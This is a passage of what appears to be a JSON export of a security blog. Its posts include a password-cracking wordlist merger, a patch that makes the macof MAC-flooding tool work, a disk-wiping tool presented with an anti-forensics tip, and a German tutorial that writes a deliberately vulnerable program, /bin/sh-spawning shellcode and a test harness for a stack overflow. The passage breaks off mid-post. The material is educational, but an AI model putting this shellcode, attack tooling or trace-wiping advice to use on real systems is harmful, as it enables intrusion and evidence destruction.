cracking tools do not support this feature. This makes perfectly sense, because the task of a password cracking tool is cracking passwords. We need a tool which creates line wise cross combinations of text files.","date":"2015-08-05T00:00:00.000Z","tags":[],"readingTime":2.325,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Merging wordlist files","date":"2015-08-05","layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"New Malware: \\"Pro InvoiceWMZ45445\\"","permalink":"/blog/2015/12/01/new-malware-pro-invoicewmz45445"},"nextItem":{"title":"Rexgen is back again","permalink":"/blog/2015/03/08/rexgen-is-back-again"}},"content":"Sometimes when cracking password, one has to create password candidates which are combinations of words from a wordlist. Unfortunately, common password cracking tools do not support this feature. This makes perfectly sense, because the task of a password cracking tool is cracking passwords. We need a tool which creates line wise cross combinations of text files.\\n\\nUsing perl, this is a simple task:\\n\\n```perl\\n#!/usr/bin/perl -w\\n\\n#/usr/bin/perl -w\\nuse strict;\\nuse warnings;\\nuse Getopt::Long;\\n\\nmy $first = \'-\';\\nmy $second = undef;\\nmy $dest = \'-\';\\nmy $max_length = undef;\\n\\nsub Usage(;$) {\\n    my $usage = \'\';\\n    if (my $message = shift) {\\n        $usage .= $message . \\"n\\";\\n    }\\n\\n    $usage .= \\"crossproduct.pl --first=<infile> --second=<infile> --dest=<outfile>\\";\\n    $usage;\\n}\\n\\nsub ValidateInputFile($) {\\n    my $filename = shift;\\n    return if $filename eq \'-\';\\n    -f $filename or die Usage(\\"\'$filename\' is not a file\\");\\n    -r $filename or die Usage(\\"\'$filename\' is not readable\\");\\n}\\n\\nsub ValidateOutputFile($) {\\n    my $filename = shift;\\n    return if $filename eq \'-\';\\n    return unless -e $filename;\\n\\n    # the file does not exist, so it will be created\\n    -f $filename or die Usage(\\"\'$filename\' is not a file\\");\\n    -w $filename or die Usage(\\"\'$filename\' is not writable\\");\\n}\\n\\nGetOptions (\\n    \\"first=s\\" => $first,\\n    \\"second=s\\" => $second,\\n    \\"dest=s\\" => $dest,\\n    \\"length=i\\" => $max_length) or die Usage();\\n\\ndefined($first) or die Usage(\\"missing first input file\\");\\ndefined($second) or die Usage(\\"missing second input file\\");\\n($first ne \'-\' or $second or \'-\') or die Usage(\\"cannot combine stdin with itself\\");\\n\\nValidateInputFile($first);\\nValidateInputFile($second);\\nValidateOutputFile($dest);\\n\\nmy ($first_fh, $second_fh, $dest_fh);\\nif ($first eq \'-\') {\\n    $first_fh = *STDIN;\\n} else {\\n    open($first_fh, \\"<$first\\") or die Usage($!);\\n}\\n\\nif ($second eq \'-\') {\\n    $second_fh = *STDIN;\\n} else {\\n    open($second_fh, \\"<$second\\") or die Usage($!);\\n}\\n\\nif ($dest eq \'-\') {\\n    $dest_fh = *STDOUT;\\n} else {\\n    open($dest_fh, \\">$dest\\") or die Usage($!);\\n}\\n\\nmy ($a, $b, $da, $db);\\nmy ($dest_first, $dest_second);\\n\\nif ($first eq \'-\') {\\n    ($a, $b) = ($first_fh, $second_fh); \\n    ($dest_first, $dest_second) = ($da, $db);\\n} else {\\n    ($a, $b) = ($second_fh, $first_fh);\\n    ($dest_second, $dest_first) = ($da, $db);\\n}\\n\\nwhile ($da = <$a>) {\\n    seek($b, 0, 0);\\n    while ($db = <$b>) {\\n        chomp $da;\\n        chomp $db;\\n        my $word = \\"$$dest_first$$dest_second\\";\\n        if ($max_length) {\\n            $word = substr($word, 1, $max_length); \\n        }\\n\\n        print $dest_fh \\"$word\\";\\n    }\\n}\\n```\\n\\nThe script has 4 parameters:\\n\\n|Parameter|Meaning|\\n|---------|-------|\\n|`--first`|file name of the wordlist for the first part of the generated words; or \\"-\\" for stdin (which is the default value)\\n|`--second`|file name of the wordlist for the second\xa0part of the generated words; or \\"-\\" for stdin\\n|`--dest`|name of the file where the generated wordlist will be stored; or \\"-\\" for stdout (which is the default value) \\n|`--length`|maximum length of generated words. All words which are longer then this value will be truncated. This parameter is optional. If you use this parameter, you should pipe the output to uniq"},{"id":"/2015/03/08/rexgen-is-back-again","metadata":{"permalink":"/blog/2015/03/08/rexgen-is-back-again","source":"@site/blog/2015-03-08-rexgen-is-back-again.mdx","title":"Rexgen is back again","description":"... with a new version 1.2.3 and a new repository location//github.com/janstarke/rexgen","date":"2015-03-08T00:00:00.000Z","tags":[],"readingTime":0.8,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Rexgen is back again","date":"2015-03-08","categories":["allgemein"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Merging wordlist files","permalink":"/blog/2015/08/05/merging-wordlist-files"},"nextItem":{"title":"How to (not) hack jasa\'s blog","permalink":"/blog/2015/02/11/how-to-not-hack-jasas-blog"}},"content":"... with a new version 1.2.3 and a new repository location: [https://github.com/janstarke/rexgen](https://github.com/janstarke/rexgen)\\n\\n## New features:\\n\\n- improved uppercase/lowercase variation: \'a(?i:bc)\' creates abc, abC, aBC, aBc\\n- that\'s it. But I had to rewrite a lot of internal data representation, so that the modifier `i` for _ignore case_ may be the first one in long list of additional iterators. One of my ideas for the next versions is some kind of Levenshtein Iterator. The idea is that the modifier will create all variants of a word with a Levenshtein distance of 1\\n\\n## What else is new?\\n\\n- John the Ripper (jumbo) uses the new API of rexgen, so you can build the newest version JtR together with the newest version of rexgen\\n\\n- wfuzz does not use rexgen, until now. I created a fork of wfuzz [https://github.com/janstarke/wfuzz](https://github.com/janstarke/wfuzz). Unfortunately, xmendez ignores my pull request :-( But you can use my fork and I will try to keep it up2date\\n\\nSo long"},{"id":"/2015/02/11/how-to-not-hack-jasas-blog","metadata":{"permalink":"/blog/2015/02/11/how-to-not-hack-jasas-blog","source":"@site/blog/2015-02-11-how-to-not-hack-jasas-blog.mdx","title":"How to (not) hack jasa\'s blog","description":"Today, a strange guy tried to hack this blog. He didn\'t succeed. What a shame. So, in this post, I will try to give you some hints about what to do and what not to do if you\'re trying to hack into this blog:","date":"2015-02-11T00:00:00.000Z","tags":[],"readingTime":2.425,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"How to (not) hack jasa\'s blog","date":"2015-02-11","categories":["allgemein","pentest"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Rexgen is back again","permalink":"/blog/2015/03/08/rexgen-is-back-again"},"nextItem":{"title":"Measuring Forensic Readiness","permalink":"/blog/2015/02/02/measuring-forensic-readiness"}},"content":"Today, a strange guy tried to hack this blog. He didn\'t succeed. What a shame. So, in this post, I will try to give you some hints about what to do and what not to do if you\'re trying to hack into this blog:\\n\\n1. Try to guess my username and password. Start with jasa. This is not my username, but you can try it anyway. I\'m a hacker, so try good passwords first. You\'re a hacker too, so you are using good passwords as wesll. Start with your own passwords; maybe all hackers use the same passwords. Nope. Try \\"Raketenkatze123\\" Nope. Use the wordlist you\'ve found on the internet. After the first 1000 attempts I know which wordlist you are using and can check if my password is part of it. ...which is one thing I regularly do with all of my passwords, as soon as I find a new good wordlist.\\n\\n2. Try to find some cross site scripting. After you\'ve found one (there is none known), you can 2.a Send a malicious link to me, to steal my session 2.b Create a malicious comment, to steal my session 2.c Create a malicious comment, to exploit one of the currently known cross site request forgery vulnerabilities in wordpress.\\n\\nHave you first checked if wordpress is vulnerable against session hijacking, before you fill wordpress\'s log files and my mailbox with your useless attempts? By the way:\\n\\n3. Make sure that no one knows you. Although I cannot read wordpress\'s log files, you\'ve been so kind to try to create a malicious comment. I\'ve got a notification about this. Now, I have your IP address and the corresponding time. Did you know that it is possible to identify the computer you are using at the moment? The power feature is called \\"Telecommunications data retention\\"\\n\\n4. Try to find a SQL injection vulnerability. Good luck. In the meantime I was able to geolocate your position, using your IP. Until now, you violated at least 2 statutes of the country you are living in.\\n\\n5. Before you did some reconnaissance, hopefully you made sure that no other legal persons are involved in your attack. Now, you determine that my blog is not hosted by me, but by wordpress.com, whose place of jurisdiction is the United States. D\'oh. They know your IP address, too.\\n\\n6. Double-check that you typed the URL of this blog using your keyboard. You didn\'t want to click on a link to this blog, because I could see your Referer :-b\\n\\n7. This is a blog about security (among others). Make sure your browser is up to date before you open this page (TODO: I must move this entry to position 1)\\n\\nKind regards\\n\\nSee you tomorrow, M. :-)\\n\\nBTW, I forgot to say that you forgot to do a port scan against the LB of wordpress.com. Which doesn\'t matter anymore ... Knock knock"},{"id":"/2015/02/02/measuring-forensic-readiness","metadata":{"permalink":"/blog/2015/02/02/measuring-forensic-readiness","source":"@site/blog/2015-02-02-measuring-forensic-readiness.mdx","title":"Measuring Forensic Readiness","description":"Most of our customers need help in optimizing their infrastructure security. What does that mean? You want to","date":"2015-02-02T00:00:00.000Z","tags":[],"readingTime":1.305,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Measuring Forensic Readiness","date":"2015-02-02","categories":["forensics"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"How to (not) hack jasa\'s blog","permalink":"/blog/2015/02/11/how-to-not-hack-jasas-blog"},"nextItem":{"title":"Invalid TCP segments created by macof","permalink":"/blog/2015/02/01/invalid-tcp-segments-created-by-macof"}},"content":"Most of our customers need help in optimizing their infrastructure security. What does that mean? You want to\\n\\n- minimize your attack surface\\n- prevent any successful attacks to (publicly) available services\\n- limit the impact of successful attacks\\n- be able to recover after a successful attack\\n- know what actually happened\\n\\nThis last point, knowing what actually happened, can be achieved through various approaches:\\n\\n- You could do logging of all significant events\\n- You could use a SIEM component to collect, correlate and evaluate all logging events and, if you want to, netflow data\\n- You can do forensic analysis of your hard drives, log files, etc.\\n\\nForensic Readiness first seemed to us as the situation in which you are able to do forensics. But this is not precise enough. In fact, we can determine multiple levels of forensic readiness, in which you are able to answer the following questions:\\n\\n1. Did anything happen at all?\\n2. What have been the symptoms of the incident?\\n3. When did the symptoms first arise?\\n4. Which systems are affected?\\n5. What exactly happened to the affected systems?\\n6. At which day and time did the attack start?\\n7. Which other machines are compromised as well?\\n8. From which machines did the attack originate?\\n9. Which user account was used to initially run the attack?\\n10. Which persons are able to use the user account that ran the attack\\n\\nThe more questions you was able to answer (in order) in the case an incident occurs, the more \\"forensic ready\\" are you."},{"id":"/2015/02/01/invalid-tcp-segments-created-by-macof","metadata":{"permalink":"/blog/2015/02/01/invalid-tcp-segments-created-by-macof","source":"@site/blog/2015-02-01-invalid-tcp-segments-created-by-macof.mdx","title":"Invalid TCP segments created by macof","description":"Some days ago, we used the tool macof, which is part of the dsniff package, in one penetration test. We observed that our attack had no effect to the hosts in the network, so we started sniffing around. Wireshark was our friend.","date":"2015-02-01T00:00:00.000Z","tags":[],"readingTime":1.575,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Invalid TCP segments created by macof","date":"2015-02-01","categories":["allgemein","pentest"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Measuring Forensic Readiness","permalink":"/blog/2015/02/02/measuring-forensic-readiness"},"nextItem":{"title":"Userspace tool for (anti-forensically safe) wiping unallocated disk space","permalink":"/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space"}},"content":"Some days ago, we used the tool _macof_, which is part of the [dsniff](http://www.monkey.org/~dugsong/dsniff/ \\"dsniff\\") package, in one penetration test. We observed that our attack had no effect to the hosts in the network, so we started sniffing around. Wireshark was our friend.\\n\\nWireshark identified our packets, generated by _macof_, as \\"invalid\\". It took some time for us to realize that IP Header value for _Total Length_ was indeed wrong! We used _macof_ to send TCP SYN segments to some specific port, so _Total Length_ should be 40 (20 Byte IP Header + 20 Byte TCP Header), but macos generated packets with a value of 20.\\n\\nSo we started a little code reading session and found the following statements in macof.c:\\n\\n```c\\nlibnet_build_tcp(sport, dport, seq, 0, TH_SYN, 512, 0, 0, LIBNET_TCP_H, NULL, 0, l, 0);\\n\\nlibnet_build_ipv4(LIBNET_TCP_H, 0, libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_TCP, 0, src, dst, NULL, 0, l, 0);\\n```\\n\\nObviously, the length of the IP Header is not included in this calculation. We changed the above statements to\\n\\n```c\\nlibnet_build_tcp(sport, dport, seq, 0, TH_SYN, 512, 0, 0, LIBNET_TCP_H, NULL, 0, l, 0);\\n\\nlibnet_build_ipv4(LIBNET_IPV4_H+LIBNET_TCP_H, 0, libnet_get_prand(LIBNET_PRu16), 0, 64, IPPROTO_TCP, 0, src, dst, NULL, 0, l, 0);\\n```\\n\\nwith the result, that Wireshark didn\'t complain about our packets anymore.\\n\\nAnd, more important, our attack did work now :-)\\n\\nAfter the test, I sent an email to the author of macof and dsniff, including a patch of what we\'ve done, but until today I received no answer. So, I\'ll publsh our patch here, and you are free to use it:\\n\\n```shell\\n\xa0diff -rupN dsniff-2.4_beta1-r6/macof.c dsniff-2.4_beta1-r6_FIX/macof.c\\n````\\n\\n```diff\\n--- dsniff-2.4_beta1-r6/macof.c\\t2015-01-20 08:50:53.980054279 +0100\\n+++ dsniff-2.4_beta1-r6_FIX/macof.c\\t2015-01-20 08:51:24.220054894 +0100\\n@@ -134,7 +134,7 @@ main(int argc, char *argv[])\\n \\t\\tlibnet_build_tcp(sport, dport, seq, 0, TH_SYN, 512,\\n \\t\\t\\t\\t 0, 0, LIBNET_TCP_H, NULL, 0, l, 0);\\n \\t\\t\\n-\\t\\tlibnet_build_ipv4(LIBNET_TCP_H, 0,\\n+\\t\\tlibnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0,\\n \\t\\t\\t\\t  libnet_get_prand(LIBNET_PRu16), 0, 64,\\n \\t\\t\\t\\t  IPPROTO_TCP, 0, src, dst, NULL, 0, l, 0);\\n```"},{"id":"/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space","metadata":{"permalink":"/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space","source":"@site/blog/2014-02-20-userspace-tool-for-wiping-unallocated-disk-space.mdx","title":"Userspace tool for (anti-forensically safe) wiping unallocated disk space","description":"This is just a simple idea and could as easily be rewritten in, e.g., Powershell, Perl, Python or whatever you want.","date":"2014-02-20T00:00:00.000Z","tags":[],"readingTime":1.52,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Userspace tool for (anti-forensically safe) wiping unallocated disk space","date":"2014-02-20","categories":["forensics"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Invalid TCP segments created by macof","permalink":"/blog/2015/02/01/invalid-tcp-segments-created-by-macof"},"nextItem":{"title":"Solaris: Bufferoverflows in lx-Zones ausnutzen","permalink":"/blog/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen"}},"content":"This is just a simple idea and could as easily be rewritten in, e.g., Powershell, Perl, Python or whatever you want.\\n\\nI had some problems with compressing the image of a virtual machine, which has been intensively used for a long period of time. I deleted all files inside the VM, but this does not really wipe the data, so that blocks of deleted files must be compressed as well. The simple fix of this is to overwrite unallocated blocks with all zeros.\\n\\nNow, how to accomplish this? This is easy: We create a new file, and fill it with zeros. If we are finished (`fwrite()`failes), we are done and delete the file. That\'s it.\\n\\nHere is the code. Feel free to reimplement it in the language of your choice:\\n\\n```c\\n#include <stdio.h>\\n#include <stdlib.h>\\n#include <string.h>\\n#include <signal.h>\\n\\nconst size_t block_size = 512;\\nconst size_t block_count = 1;\\nstatic const char* filename = \\"diskwipe.dat\\";\\nstatic char* block = 0;\\nstatic FILE* fp = NULL;\\n\\nvoid cleanup() {\\n\\tif (block) {\\n\\t\\tfree(block);\\n\\t}\\n\\n\\tif (fp != NULL) {\\n\\t\\tfflush(fp);\\n\\t\\tfclose(fp);\\n\\t\\tfp = NULL;\\n\\t}\\n\\n\\tif (0 != _unlink(filename)) {\\n\\t\\tperror(\\"Unable to delete diskwipe.dat: \\");\\n\\t}\\n}\\n\\nvoid finish(int res) {\\n\\tcleanup();\\n\\texit(res);\\n}\\n\\nvoid handle_sigint (int sig) {\\n\\tfinish(1);\\n}\\n\\nvoid do_wipe() {\\n\\tunsigned long int count = 0;\\n\\tfp = fopen(filename, \\"wbc\\");\\n\\tif (fp == NULL) {\\n\\t\\tperror(\\"Unable to open diskwipe.dat: \\");\\n\\t\\tfinish(1);\\n\\t}\\n\\n\\twhile (block_count == fwrite(block, block_size, block_count, fp)) {\\n\\t\\tfflush(fp);\\n\\t\\tfprintf(stderr, \\"\\\\\\\\r%lu\\", ++count);\\n\\t}\\n\\tfclose(fp);\\n}\\n\\nint main(int argc, char* argv[]) {\\n\\tsignal(SIGINT, handle_sigint);\\n\\n\\tblock = (char*) malloc(block_size);\\n\\tmemset(block, 0, block_size);\\n\\t\\n\\tdo_wipe();\\n\\tfinish(0);\\n}\\n```\\n\\nBy the way, this is a very simple way for doing anti forensics:\\n\\n1. do bad stuff\\n1. delete your files/traces\\n1. do a userspace wipe using a builtin scripting language, preferably using a one-liner"},{"id":"/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen","metadata":{"permalink":"/blog/2014/01/27/solaris-bufferoverflows-in-lx-zones-ausnutzen","source":"@site/blog/2014-01-27-solaris-bufferoverflows-in-lx-zones-ausnutzen.mdx","title":"Solaris: Bufferoverflows in lx-Zones ausnutzen","description":"In diesem Artikel wird gezeigt, dass es m\xf6glich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuf\xfchren, wenn dieser einen bestimmten Aufbau hat.","date":"2014-01-27T00:00:00.000Z","tags":[],"readingTime":6.63,"hasTruncateMarker":false,"authors":[{"name":"Jan Starke","title":"Senior Forensic Analyst","url":"https://github.com/janstarke","imageURL":"https://github.com/janstarke.png","key":"jasa"}],"frontMatter":{"title":"Solaris: Bufferoverflows in lx-Zones ausnutzen","date":"2014-01-27","categories":["exploits","pentest"],"layout":"post","authors":["jasa"]},"unlisted":false,"prevItem":{"title":"Userspace tool for (anti-forensically safe) wiping unallocated disk space","permalink":"/blog/2014/02/20/userspace-tool-for-wiping-unallocated-disk-space"}},"content":"In diesem Artikel wird gezeigt, dass es m\xf6glich ist, in einer Linux-Zone unter Solaris einen Shellcode auszuf\xfchren, wenn dieser einen bestimmten Aufbau hat.\\n\\nZun\xe4chst wird beispielhaft ein Programm gezeigt, dass eine Bufferoverflow-Schwachstelle hat. Anschlie\xdfend wird ein Shellcode entwickelt, der die Besonderheiten der User-Level-Calls in einer lx-Zone unter Solaris ber\xfccksichtigt. Das wird erreicht, indem der lx_brandz.so.1 ein virtueller Stack untergeschoben wird, damit der Shellcode w\xe4hrend des Aufrufs von exec() nicht ver\xe4ndert wird. Abschlie\xdfend werden ein Programm und ein Script entwickelt, die zusammen einen kompletten Injection-Vector erzeugen.\\n\\n# Das Opfer...\\n\\nUm das Beispiel einfach zu halten, wird ein einfacher Stack-basierter \xdcberlauf genutzt. Das angegriffene Programm wird nachfolgend gezeigt:\\n\\n```c\\n#include <stdio.h>\\n#include <sys/mman.h>\\n#include <errno.h>\\n\\n#define UNPROTECT_STACK\\n#define STACK_BEGIN 0x08046000\\n#define STACK_SIZE 8192\\n#define STACK_PERMISSIONS PROT_READ | PROT_WRITE | PROT_EXEC\\n```\\n\\nDie Funktion `__get_esp()` wird \xfcber das Makro `TRACE_ESP` genutzt, um die Adresse des Stack auszugeben. Normalerweise steht in einem anzugreifenden Programm dieses Feature nicht zur Verf\xfcgung, daher kann es auch hier abgeschaltet werden. In einem solchen Fall kann der Wert des `%esp`\\\\-Registers einfach \xfcber die Nutzung eines Debuggers ermittelt werden.\\n\\n```c\\nunsigned long __get_esp() {\\n  __asm__(\\"movl %esp,%eax\\");\\n}\\n#ifdef PRINT_ESP\\n#define TRACE_ESP(functionname) \\\\\\n\xa0(printf(\\"%s at %%esp: 0x%08x\\\\n\\", (functionname), __get_esp()))\\n#else\\n#define TRACE_ESP(functionname)\\n#endif\\n```\\n\\nAus Demonstrationszwecken wurde die Funktion `__gets()` programmiert, die sich jedoch in etwa wie `gets()` verh\xe4lt. Der qualitative Unterschied ist, dass das Verhalten der Funktion beim Lesen von Bin\xe4rdaten besser beeinflusst werden kann.\\n\\n```c\\n/* dangerous: __gets is evil!!! never call this function!!! */\\nvoid __gets(char* ptr) {\\n char c;\\n while (fread(&c, sizeof(c), 1, stdin)) {\\n  if (c == \'\\\\n\')\\n   break;\\n  else\\n   *ptr++ = c;\\n }\\n *ptr = \'\\\\0\';\\n}\\n```\\n\\nDer Angriff selbst richtet sich gegen die Funktion `do_work()`. Es wird ausgenutzt, dass `__gets()` in den Buffer name schreibt, ohne zu pr\xfcfen, ob gen\xfcgend Platz im Buffer ist.\\n\\n```c\\nvoid do_work() {\\n char name[512];\\n TRACE_ESP(\\"do_work\\");\\n printf(\\"What\'s your name? \\");\\n __gets(name);\\n printf(\\"hello, %s\\\\n\\", name);\\n}\\n```\\n\\nInteressant ist im Hauptprogramm vor dem Aufruf von `do_work()` die Manipulation der Zugriffsrechte des Stacks. Hier ist es f\xfcr den Interessierten m\xf6glich, zu testen, wie sich das Programm bei eingeschr\xe4nkten Zugriffsrechten (insbesondere ohne `PROT_EXEC`) verh\xe4lt.\\n\\n```c\\nint main(void) {\\n#ifdef UNPROTECT_STACK\\n if (0 != mprotect((void*)STACK_BEGIN,\\n       STACK_SIZE, STACK_PERMISSIONS)) {\\n  fprintf(stderr, \\"mprotect: %s\\\\n\\", strerror(errno));\\n  return -1;\\n }\\n#endif\\n TRACE_ESP(\\"main\\");\\n do_work();\\n return 1;\\n}\\n```\\n\\n# Der T\xe4ter\\n\\nDer Shellcode arbeitet in mehreren Schritten:\\n\\n- Sprung zum Ende des Shellcodes (`call_position`) und wieder zur\xfcck an den Anfang. Damit liegt die Adresse des ersten Bytes nach dem call auf dem Stack. Diese wird dann in `%esi` gespeichert.\\n- Anlegen eines neuen Stackframes unterhalb des Shellcodes. Das Problem ist, dass in der Testumgebung (Solaris Brandz mit Linux) ein Aufruf von `int $0x80` in eine Anwendungsbibliothek (`lx_brandz.so.1`) weitergeleitet wird. Diese Funktionsaufrufe belegen nat\xfcrlich Platz auf unserem Stack und \xfcberschreiben die Zeichenkette `\\"/bin/sh\\"` und die beiden Pointer `argv` und `env`. Durch das Erzeugen des neuen Stackframes werden die Daten vor dem \xdcberschreiben gesch\xfctzt.\\n- `stdin` schlie\xdfen und wieder neu starten. Bei der Vorf\xfchrung wird das Programm den Injection Vector (IV) per Pipe oder Eingabeumleitung lesen. Nach dem vollst\xe4ndigen Lesen des IV und anschlie\xdfenden Starten von `/bin/sh` wird `read()` keine Daten mehr zu lesen haben, was die Shell als `EOF` interpretiert und sich beendet. Daher schlie\xdfen wir die Pipe und \xf6ffnen `/dev/tty` als Dateideskriptor 0, was `stdin` entspricht.\\n- Ausf\xfchren von `/bin/sh`. Eine ausf\xfchrliche Erkl\xe4rung dieses Programmfragments findet sich in [Aleph One: Smashing The Stack For Fun And Profit. Phrack, Volume Seven, Issue Forty-Nine](http://www.phrack.com/issues.html?issue=49&id=14 \\"Smashing The Stack For Fun And Profit\\").\\n\\n```c\\nchar shellcode[] = \\n  \\"\\\\xeb\\\\x43\\"      /*   jmp    0x804840d <call_position> */\\n  \\"\\\\x5e\\"          /*   pop    %esi */\\n /* create artificial stack begin */\\n  \\"\\\\x89\\\\xf4\\"      /*   mov    %esi, %esp */\\n  \\"\\\\x89\\\\xf5\\"      /*   mov  %esi, %ebp */\\n  \\"\\\\x83\\\\xed\\\\x40\\"  /*   sub  $0x40, %ebp */\\n  \\"\\\\x83\\\\xec\\\\x60\\"  /*   sub  $0x60, %esp */\\n /* close stdin and reopen it */\\n  \\"\\\\x56\\"          /*   push   %esi */\\n  \\"\\\\x31\\\\xc0\\"      /*   xor    %eax,%eax */\\n  \\"\\\\xb0\\\\x06\\"      /*   mov    $0x6,%al */\\n  \\"\\\\x31\\\\xdb\\"      /*   xor    %ebx,%ebx */\\n  \\"\\\\xcd\\\\x80\\"      /*   int    $0x80 */\\n  \\"\\\\x5e\\"          /*   pop    %esi */\\n  \\"\\\\x56\\"          /*   push   %esi */\\n  \\"\\\\x31\\\\xc0\\"      /*   xor    %eax,%eax */\\n  \\"\\\\x88\\\\x46\\\\x0f\\"  /*   mov    %al,0x0f(%esi) */\\n  \\"\\\\xb0\\\\x05\\"      /*   mov    $0x5,%al */\\n  \\"\\\\x8d\\\\x5e\\\\x07\\"  /*   lea    0x7(%esi),%ebx */\\n  \\"\\\\x31\\\\xc9\\"      /*   xor    %ecx,%ecx */\\n  \\"\\\\xcd\\\\x80\\"      /*   int    $0x80 */\\n  \\"\\\\x5e\\"          /*   pop    %esi */\\n /* exec /bin/sh (I copied the whole thing from shellcode.org) */\\n  \\"\\\\x89\\\\x76\\\\x08\\"  /*   mov    %esi,0x8(%esi) */\\n  \\"\\\\x31\\\\xc0\\"      /*   xor    %eax,%eax */\\n  \\"\\\\x88\\\\x46\\\\x07\\"  /*   mov    %al,0x7(%esi) */\\n  \\"\\\\x89\\\\x46\\\\x0c\\"  /*   mov    %eax,0xc(%esi) */\\n  \\"\\\\xb0\\\\x0b\\"      /*   mov    $0xb,%al */\\n  \\"\\\\x89\\\\xf3\\"      /*   mov    %esi,%ebx */\\n  \\"\\\\x8d\\\\x4e\\\\x08\\"  /*   lea    0x8(%esi),%ecx */\\n  \\"\\\\x8d\\\\x56\\\\x0c\\"  /*   lea    0xc(%esi),%edx */\\n  \\"\\\\xcd\\\\x80\\"      /*   int    $0x80 */\\n  \\"\\\\x31\\\\xdb\\"      /*   xor    %ebx,%ebx */\\n  \\"\\\\x89\\\\xd8\\"      /*   mov    %ebx,%eax */\\n  \\"\\\\x40\\"          /*   inc    %eax */\\n  \\"\\\\xcd\\\\x80\\"      /*   int    $0x80 */\\n  \\"\\\\xe8\\\\xb8\\\\xff\\\\xff\\\\xff\\"  /*   call   start_of_exploit */\\n  \\"/bin/sh\\"\\n  \\"/dev/tty\\";\\n```\\n\\n# `shellcode.c`\\n\\nWir nutzen nachfolgendes Programm, um den Shellcode auszugeben bzw. den Injection Vector zu konstruieren. Das Programm versteht die Parameter `-l` (Ausgeben der L\xe4nge des Shellcode) und `-x` (Ausf\xfchren des Shellcodes). Wenn man das Programm ohne Parameter ausf\xfchrt, wird der Shellcode auf `stdout` ausgegeben.\\n\\nDer Shellcode selbst sollte in einer Variable namens `shellcode` gespeichert sein, die wiederum in einer Headerdatei definiert ist. Diese Headerdatei wird -- ungew\xf6hnlicherweise -- mitten innerhalb von main() eingebunden. Die Ursache daf\xfcr ist, dass der Shellcode davon ausgeht, sich innerhalb des Stacks zu befinden. Um den Shellcode zu testen, sollte man also eine m\xf6glichst realistische Umgebung schaffen und den Shellcode in einem lokalen Puffer speichern.\\n\\nAuch hier m\xf6chte ich wieder auf die M\xf6glichkeit hinweisen, die Verhaltensweise des Shellcodes bei einem mit `mprotect()` gesch\xfctzten Stack auszuprobieren.\\n\\n```c\\n#include <stdio.h>\\n#include <string.h>\\n#include <sys/mman.h>\\n \\nint\\nmain(int argc, char* argv[]) {\\n/* include shellcode buffer here, so that it is stored on the stack */\\n#include \\"own.c\\"\\n if (argc == 1) {\\n  printf(\\"%s\\", shellcode);\\n  return 0;\\n }\\n if (argc == 2 && 0 == strcmp(argv[1], \\"-l\\")) {\\n  printf(\\"%d\\\\n\\", strlen(shellcode));\\n  return 0;\\n }\\n if (argc == 2 && 0 == strcmp(argv[1], \\"-x\\")) {\\n  /* allow to execute code on the stack */\\n  mprotect((void*)0x08046000, 8192, PROT_READ | PROT_WRITE | PROT_EXEC);\\n  void (*code)() = (void(*)())shellcode;\\n  code();\\n  return -1;\\n }\\n fprintf(stderr, \\"Usage: %s [-l|-x]\\\\n\\", argv[0]);\\n return 1;\\n}\\n```\\n\\n# `shellcode.pl`\\n\\nDieses Perl-Script ist ein Wrapper f\xfcr das aus `shellcode.c` entstehende Programm, der den kompletten Injection Vector (IV) konstruiert. Der IV besteht aus folgenden Teilen:\\n\\n- viele NOPs. Dieser Bereich wird zum NOP-Sliding genutzt, da wir uns hier nicht damit besch\xe4ftigen wollen, wie wir den Shellcode direkt bytegenau ansprechen k\xf6nnen.\\n- Shellcode\\n- nochmal NOPs. Manchmal k\xf6nnte es sinnvoll sein, den Shellcode etwas in den Bereich niedriger Adressen zu verschieben. Als Platzhalter bis zum Instruction Pointer dienen diese NOP-Befehle. EBP. Eine 4 Byte gro\xdfe Zahl, die die Basisadresse des n\xe4chsth\xf6heren Stackframes ist. Da unser Shellcode einen neuen Stackframe anlegt, kann diese Zahl beliebig sein. EIP. Eine 4 Byte gro\xdfe Zahl, die die Adresse des ersten auszuf\xfchrenden Befehls des IV ist. Den korrekten Wert dieser Adresse zu ermitteln bedeutet, sich einige Zeit mit einem Debugger zu besch\xe4ftigen. Ich m\xf6chte hier ebenfalls auf die Lekt\xfcre der sehr ausf\xfchrlichen Texte des Phrack-Magazins verweisen. Das Script bekommt als Parameter die L\xe4nge des zu \xfcberschreibenden Puffers und die Anzahl der nach dem Shellcode einzuf\xfcgenden NOPs \xfcbergeben. Wie man diese Zahlen ermittelt, wird an dieser Stelle ebenfalls nicht besprochen.\\n    \\n    Die Gesamtgr\xf6\xdfe des auf `stdout` ausgegebenen 